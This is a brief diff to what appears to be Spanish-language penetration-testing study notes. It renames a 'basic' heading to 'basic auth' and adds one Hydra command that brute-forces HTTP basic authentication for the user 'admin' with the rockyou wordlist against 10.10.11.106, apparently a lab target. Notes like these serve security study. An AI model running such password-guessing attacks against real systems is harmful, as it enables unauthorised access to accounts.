@@ -34,7 +34,12 @@ Ejemplos hay que practicar
 
 ```
 
-basic
+basic auth
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.11.106 http-get /
+
+```
 
 ### Proxy
 
